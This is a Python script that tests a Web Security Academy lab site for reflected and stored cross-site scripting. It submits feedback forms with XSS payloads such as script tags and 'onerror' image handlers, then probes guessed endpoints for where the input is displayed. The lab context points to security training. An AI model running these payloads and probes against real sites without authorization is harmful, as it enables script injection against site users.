#!/usr/bin/env python3
import requests
import re
from bs4 import BeautifulSoup

# Target URL
BASE_URL = "https://0a3900c304b67111838b512800a90077.web-security-academy.net"

def get_csrf_token(session, url):
    """Extract CSRF token from a page"""
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Look for CSRF token in various ways
    csrf_input = soup.find('input', {'name': 'csrf'})
    if csrf_input:
        return csrf_input.get('value')
    
    # Try to find it in meta tags
    csrf_meta = soup.find('meta', {'name': 'csrf-token'})
    if csrf_meta:
        return csrf_meta.get('content')
    
    return None

def submit_feedback(session, name_payload):
    """Submit feedback and track where it goes"""
    feedback_url = f"{BASE_URL}/feedback"
    
    # Get CSRF token if needed
    csrf_token = get_csrf_token(session, feedback_url)
    
    # Prepare form data
    form_data = {
        'name': name_payload,
        'email': 'test@test.com',
        'subject': 'Test Subject',
        'message': 'Test message'
    }
    
    if csrf_token:
        form_data['csrf'] = csrf_token
    
    # Submit the form
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': BASE_URL,
        'Referer': feedback_url
    }
    
    # First, let's see what action the form has
    form_response = session.get(feedback_url)
    soup = BeautifulSoup(form_response.text, 'html.parser')
    form = soup.find('form')
    
    if form:
        action = form.get('action', '/feedback/submit')
        method = form.get('method', 'POST').upper()
        
        # Build the submit URL
        if action.startswith('/'):
            submit_url = BASE_URL + action
        elif action.startswith('http'):
            submit_url = action
        else:
            submit_url = feedback_url.rsplit('/', 1)[0] + '/' + action
        
        print(f"[*] Form action: {action}")
        print(f"[*] Form method: {method}")
        print(f"[*] Submit URL: {submit_url}")
        
        # Submit the form
        if method == 'POST':
            response = session.post(submit_url, data=form_data, headers=headers, allow_redirects=False)
        else:
            response = session.get(submit_url, params=form_data, headers=headers, allow_redirects=False)
        
        print(f"[*] Response status: {response.status_code}")
        
        # Check for redirects
        if response.status_code in [301, 302, 303, 307, 308]:
            redirect_url = response.headers.get('Location')
            print(f"[*] Redirected to: {redirect_url}")
            
            # Follow the redirect
            if redirect_url:
                if redirect_url.startswith('/'):
                    redirect_url = BASE_URL + redirect_url
                follow_response = session.get(redirect_url)
                return follow_response
        
        return response
    
    return None

def check_feedback_display(session):
    """Check various endpoints where feedback might be displayed"""
    endpoints = [
        '/feedback',
        '/feedback/display',
        '/feedback/view',
        '/feedback/list',
        '/admin/feedback',
        '/submissions',
        '/comments',
        '/',
    ]
    
    for endpoint in endpoints:
        url = BASE_URL + endpoint
        try:
            response = session.get(url, timeout=5)
            if response.status_code == 200:
                print(f"[✓] Found accessible endpoint: {endpoint}")
                return response
            elif response.status_code == 401:
                print(f"[!] Authentication required for: {endpoint}")
            elif response.status_code == 403:
                print(f"[!] Forbidden: {endpoint}")
        except:
            pass
    
    return None

def main():
    print(f"[*] Testing XSS on: {BASE_URL}")
    
    session = requests.Session()
    
    # Test simple HTML injection first
    test_payloads = [
        '<h1>XSS Test</h1>',
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<h1 onclick="alert(1)">Click me</h1>',
    ]
    
    for payload in test_payloads:
        print(f"\\n[*] Testing payload: {payload}")
        
        response = submit_feedback(session, payload)
        
        if response:
            # Check if the payload is reflected in the response
            if payload in response.text:
                print(f"[✓] Payload reflected directly!")
                
                # Save response for analysis
                with open('xss_response.html', 'w') as f:
                    f.write(response.text)
                print("[*] Response saved to xss_response.html")
                
                # Try to find where on the page it's reflected
                lines = response.text.split('\\n')
                for i, line in enumerate(lines):
                    if payload in line:
                        print(f"[*] Found at line {i+1}: {line[:100]}...")
            else:
                print("[✗] Payload not reflected in immediate response")
                
                # Check if it's stored somewhere else
                print("[*] Checking other endpoints for stored XSS...")
                display_response = check_feedback_display(session)
                
                if display_response and payload in display_response.text:
                    print(f"[✓] Stored XSS found!")
                    with open('stored_xss_response.html', 'w') as f:
                        f.write(display_response.text)
                    print("[*] Response saved to stored_xss_response.html")

if __name__ == "__main__":
    main()